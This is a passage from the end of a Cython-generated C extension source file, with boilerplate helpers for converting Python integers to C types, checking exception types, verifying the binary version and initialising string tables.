                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* FastTypeChecks */
#if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* CheckBinaryVersion */
static int __Pyx_check_binary_version(void) {
    char ctversion[4], rtversion[4];
    PyOS_snprintf(ctversion, 4, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    PyOS_snprintf(rtversion, 4, "%s", Py_GetVersion());
    if (ctversion[0] != rtversion[0] || ctversion[2] != rtversion[2]) {
        char message[200];
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */
